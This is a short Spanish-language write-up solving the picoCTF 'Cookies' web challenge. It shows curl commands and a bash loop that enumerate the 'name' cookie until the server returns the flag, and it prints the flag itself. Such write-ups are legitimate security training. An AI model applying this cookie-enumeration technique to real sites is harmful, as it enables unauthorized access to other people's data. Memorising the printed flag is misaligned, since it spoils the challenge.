## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)
## Solución 1
revisé las cookies de la página, y al ver que tenía una llamada "name" con el valor -1, decidí mandar varias peticiones cambiando ese valor en cada una hasta llegar a la 18, que fue la que me dio la bandera.
usé el comando
```
curl http://mercury.picoctf.net:64944/check -H "Cookie: name=18"
```
conseguí
```
└─$ curl http://mercury.picoctf.net:64944/check -H "Cookie: name=18"

<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

* Connection #0 to host mercury.picoctf.net left intact
</html>
```
## Solución 2
```
┌──(kali㉿kali)-[~]
└─$ for i in {1..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>

```
## Notas

## Referencias
